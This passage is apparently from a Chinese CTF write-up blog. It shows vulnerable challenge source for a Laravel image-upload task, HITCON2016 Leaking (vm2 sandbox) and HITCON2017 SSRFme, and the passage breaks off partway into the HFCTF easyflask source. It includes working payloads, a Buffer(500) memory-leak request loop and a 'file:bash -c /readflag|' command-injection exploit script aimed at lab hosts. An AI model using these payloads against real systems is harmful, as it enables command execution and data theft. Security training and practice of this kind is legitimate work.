                <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    <span class="token operator">-</span><span class="token operator">></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">,</span> <span class="token string">'File has been uploaded.'</span><span class="token punctuation">)</span>
                    <span class="token operator">-</span><span class="token operator">></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">'Don\'t do that, please'</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token operator">-</span><span class="token operator">></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>


    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<h5 id="app-Http-Controllers-ImageController-php"><a href="#app-Http-Controllers-ImageController-php" class="headerlink" title="app/Http/Controllers/ImageController.php"></a>app/Http/Controllers/ImageController.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">ImageController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span>Request <span class="token variable">$request</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$source</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$source</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$extension</span> <span class="token operator">!==</span> <span class="token string">'png'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">'Don\'t do that, pvlease'</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token operator">-</span><span class="token operator">></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$image_name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.png'</span><span class="token punctuation">;</span>
            <span class="token variable">$dst_img</span> <span class="token operator">=</span> <span class="token string">'/var/www/html/'</span> <span class="token punctuation">.</span> <span class="token variable">$image_name</span><span class="token punctuation">;</span>
            <span class="token variable">$percent</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">imgcompress</span><span class="token punctuation">(</span><span class="token variable">$source</span><span class="token punctuation">,</span> <span class="token variable">$percent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">compressImg</span><span class="token punctuation">(</span><span class="token variable">$dst_img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string">'image_name'</span><span class="token punctuation">,</span> <span class="token variable">$image_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h5 id="app-Http-Controllers-imgcompress-php"><a href="#app-Http-Controllers-imgcompress-php" class="headerlink" title="app/Http/Controllers/imgcompress.php"></a>app/Http/Controllers/imgcompress.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span>

   <span class="token keyword">class</span> <span class="token class-name">imgcompress</span>
   <span class="token punctuation">{</span>
   <span class="token keyword">private</span> <span class="token variable">$src</span><span class="token punctuation">;</span>
   <span class="token keyword">private</span> <span class="token variable">$image</span><span class="token punctuation">;</span>
   <span class="token keyword">private</span> <span class="token variable">$imageinfo</span><span class="token punctuation">;</span>
   <span class="token keyword">private</span> <span class="token variable">$percent</span> <span class="token operator">=</span> <span class="token number">0.5</span><span class="token punctuation">;</span>

      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$src</span><span class="token punctuation">,</span> <span class="token variable">$percent</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">src</span> <span class="token operator">=</span> <span class="token variable">$src</span><span class="token punctuation">;</span>
      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">percent</span> <span class="token operator">=</span> <span class="token variable">$percent</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">compressImg</span><span class="token punctuation">(</span><span class="token variable">$saveName</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_openImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_saveImage</span><span class="token punctuation">(</span><span class="token variable">$saveName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">_openImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
      <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$width</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token punctuation">,</span> <span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$attr</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">src</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
          <span class="token string">'width'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$width</span><span class="token punctuation">,</span>
          <span class="token string">'height'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$height</span><span class="token punctuation">,</span>
          <span class="token string">'type'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">image_type_to_extension</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token string">'attr'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$attr</span>
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token variable">$fun</span> <span class="token operator">=</span> <span class="token string">"imagecreatefrom"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">image</span> <span class="token operator">=</span> <span class="token variable">$fun</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">src</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_thumpImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">_thumpImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
      <span class="token variable">$new_width</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string">'width'</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">percent</span><span class="token punctuation">;</span>
      <span class="token variable">$new_height</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">percent</span><span class="token punctuation">;</span>
      <span class="token variable">$image_thump</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token variable">$new_width</span><span class="token punctuation">,</span> <span class="token variable">$new_height</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment" spellcheck="true">//将原图复制带图片载体上面，并且按照一定比例压缩,极大的保持了清晰度</span>
      <span class="token function">imagecopyresampled</span><span class="token punctuation">(</span><span class="token variable">$image_thump</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">image</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$new_width</span><span class="token punctuation">,</span> <span class="token variable">$new_height</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string">'width'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">image</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">image</span> <span class="token operator">=</span> <span class="token variable">$image_thump</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>


      <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">_saveImage</span><span class="token punctuation">(</span><span class="token variable">$dstImgName</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$dstImgName</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
      <span class="token variable">$allowImgs</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'.jpg'</span><span class="token punctuation">,</span> <span class="token string">'.jpeg'</span><span class="token punctuation">,</span> <span class="token string">'.png'</span><span class="token punctuation">,</span> <span class="token string">'.bmp'</span><span class="token punctuation">,</span> <span class="token string">'.wbmp'</span><span class="token punctuation">,</span> <span class="token string">'.gif'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//如果目标图片名有后缀就用目标图片扩展名 后缀，如果没有，则用源图的扩展名</span>
      <span class="token variable">$dstExt</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$dstImgName</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token variable">$sourseExt</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">src</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$dstExt</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$dstExt</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$dstExt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$sourseExt</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$sourseExt</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$sourseExt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token comment" spellcheck="true">//有指定目标名扩展名</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$dstExt</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$dstExt</span><span class="token punctuation">,</span> <span class="token variable">$allowImgs</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token variable">$dstName</span> <span class="token operator">=</span> <span class="token variable">$dstImgName</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$sourseExt</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$sourseExt</span><span class="token punctuation">,</span> <span class="token variable">$allowImgs</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token variable">$dstName</span> <span class="token operator">=</span> <span class="token variable">$dstImgName</span> <span class="token punctuation">.</span> <span class="token variable">$sourseExt</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
          <span class="token variable">$dstName</span> <span class="token operator">=</span> <span class="token variable">$dstImgName</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token variable">$funcs</span> <span class="token operator">=</span> <span class="token string">"image"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">imageinfo</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token variable">$funcs</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">image</span><span class="token punctuation">,</span> <span class="token variable">$dstName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
      <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">image</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token punctuation">}</span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>HITCON2016：Leaking</title>
    <url>/2021/10/25/hitcon2016-leaking/</url>
    <content><![CDATA[<pre class=" language-js"><code class="language-js"><span class="token string">"use strict"</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> randomstring <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"randomstring"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> <span class="token punctuation">{</span>
    VM
<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./config.js"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>flag

app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/plain"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">/*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var flag_"</span> <span class="token operator">+</span> randomstring<span class="token punctuation">.</span><span class="token function">generate</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" = \"hitcon{"</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">"}\";"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>data <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>data<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VM</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            timeout<span class="token punctuation">:</span> <span class="token number">1000</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"eval ->"</span> <span class="token operator">+</span> vm<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>__filename<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"listening on port 3000!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>VM沙箱逃逸</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
url <span class="token operator">=</span> <span class="token string">'http://8f669547-6625-4707-a4f7-0ee3911f83e3.node4.buuoj.cn:81/?data=Buffer(500)'</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>

        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'trying'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'flag{'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
            <span class="token keyword">break</span></code></pre>
<p>拿到linux跑</p>
<p><img src="/2021/10/25/hitcon2016-leaking/1.png" alt="1"></p>
<p><a href="https://blog.csdn.net/cjdgg/article/details/119792059">https://blog.csdn.net/cjdgg/article/details/119792059</a></p>
<p><a href="https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md">https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md</a></p>
]]></content>
      <tags>
        <tag>VM沙箱逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>HITCON:2017-SSRFme</title>
    <url>/2021/06/08/hitcon-2017-ssrfme/</url>
    <content><![CDATA[<pre><code>&lt;?php
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
    }

    echo $_SERVER["REMOTE_ADDR"];

    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    @mkdir($sandbox);
    @chdir($sandbox);

    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    $info = pathinfo($_GET["filename"]);
    $dir  = str_replace(".", "", basename($info["dirname"]));
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info["basename"]), $data);
    highlight_file(__FILE__);</code></pre>
<ul>
<li><p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
</li>
<li><p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</p>
</li>
<li><p>pathinfo() 返回一个关联数组包含有 path 的信息。返回关联数组还是字符串取决于 options。</p>
</li>
<li><p>basename — 返回路径中的文件名部分</p>
</li>
<li><p>$_SERVER[“REMOTE_ADDR”]#是用户访问页面用的公网IP</p>
<h3 id="php-isset-函数"><a href="#php-isset-函数" class="headerlink" title="php isset 函数"></a>php isset 函数</h3><p>检测变量是否设置</p>
<p>若变量不存在则返回 FALSE </p>
<p>若变量存在且其值为NULL，也返回 FALSE </p>
<p>若变量存在且值不为NULL，则返回 TURE </p>
<h3 id="PHP-explode-函数"><a href="#PHP-explode-函数" class="headerlink" title="PHP explode 函数"></a>PHP explode 函数</h3><p>explode() 函数使用一个字符串分割另一个字符串，并返回由字符串组成的数组。</p>
<p>举例：（菜鸟教程）</p>
<pre><code>&lt;?php
$str = "www.runoob.com";
print_r (explode(".",$str));
?&gt;</code></pre>
<pre><code>Array
(
    [0] =&gt; www
    [1] =&gt; runoob
    [2] =&gt; com
)</code></pre>
</li>
</ul>
<h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h2><p>回到题目</p>
<pre><code>orange+ip地址</code></pre>
<p>访问</p>
<pre><code>/sandbox/fb8ca607c1b8f0bf763cbac72b8b6875</code></pre>
<p><img src="/2021/06/08/hitcon-2017-ssrfme/image-20210608212437627.png" alt="image-20210608212437627"></p>
<p>执行两次</p>
<pre class=" language-cpp"><code class="language-cpp"><span class="token operator">?</span>url<span class="token operator">=</span>file<span class="token operator">:</span>ls <span class="token operator">/</span><span class="token operator">|</span><span class="token operator">&amp;</span>filename<span class="token operator">=</span>ls <span class="token operator">/</span><span class="token operator">|</span></code></pre>
<p>访问：</p>
<pre><code>/sandbox/fb8ca607c1b8f0bf763cbac72b8b6875/ls /|</code></pre>
<p><img src="/2021/06/08/hitcon-2017-ssrfme/image-20210608212926383.png" alt="image-20210608212926383"></p>
<p><code>然后readflag，如果直接/readflag的话，那么会在服务器的根目录创建这个文件，而不是在网站的那个目录，所以是无法命令执行的，所以可以用bash -c 相当于./readflag，而根据php字符解析特性，如果直接将./readflag传入，那么.就会变成下划线,从而不能命令执行。直接bash的话好像是只能bash 有sh后缀的文件，所以不能用</code><br><code>综上所述，bash -c 是最好的选择</code><br>同样运行两遍</p>
<pre><code>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code></pre>
<p>进到路径即可</p>
<pre><code>sandbox/fb8ca607c1b8f0bf763cbac72b8b6875/bash%20-c%20/readflag%7C</code></pre>
<p><img src="/2021/06/08/hitcon-2017-ssrfme/image-20210608213537379.png" alt="image-20210608213537379"></p>
<p>脚本：</p>
<pre><code>#coding:utf-8
import requests

url = 'http://678e005f-4a09-4a0a-8fc8-4c03bc330ef3.node3.buuoj.cn/'
exp = 'file:bash -c /readflag|'
payload = "?url={}&amp;filename=data"
see = 'sandbox/fb8ca607c1b8f0bf763cbac72b8b6875/data'

r = requests.get(url = url+payload.format(exp))
r = requests.get(url+see)
print(r.text)</code></pre>
<p><img src="/2021/06/08/hitcon-2017-ssrfme/image-20210608214022020.png" alt="image-20210608214022020"></p>
]]></content>
      <tags>
        <tag>HITCON</tag>
      </tags>
  </entry>
  <entry>
    <title>HFCTF:2021-easyflask</title>
    <url>/2021/08/01/hfctf-2021-easyflask/</url>
    <content><![CDATA[<p><img src="/2021/08/01/hfctf-2021-easyflask/image-20210802215741280.png" alt="image-20210802215741280"></p>
<p>/app/source里的源码</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3.6</span>
<span class="token keyword">import</span> os
<span class="token keyword">import</span> pickle

<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> session

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"SECRET_KEY"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"*******"</span>

User <span class="token operator">=</span> type<span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>object<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token string">'uname'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span>
    <span class="token string">'is_admin'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token string">'__repr__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> o<span class="token punctuation">.</span>uname<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
